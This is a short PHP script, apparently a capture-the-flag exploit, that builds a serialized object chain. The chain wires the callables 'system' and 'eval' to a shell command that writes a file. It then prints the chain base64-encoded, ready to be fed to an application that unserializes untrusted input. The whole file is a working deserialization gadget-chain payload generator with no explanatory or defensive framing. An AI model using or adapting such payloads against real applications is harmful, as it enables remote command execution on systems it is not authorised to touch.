<?php
class a {
    public $test;
    public function __construct($a)
    {
        $this->test = $a;
    }
}

abstract class b {
    private $b = 1;
    public function __construct($a)
    {
        $this->b = $a;
    }
}

class c extends b {
    private $call;
    protected $value;

    public function __construct($a, $b)
    {
        $this->call = $a;
        $this->value = $b;
    }

    public function setB($c) {
        parent::__construct($c);
    }
}

class d {
    public $value;

    public function __construct($a)
    {
        $this->value = $a;

    }
}

$c = new c(
    [new d("system"), "eval"],
    [new d("echo 'wtf'>./233"), "eval"],
);
$c->setB([$c, "eval"]);
$exp = new a($c);

echo base64_encode(serialize($exp));
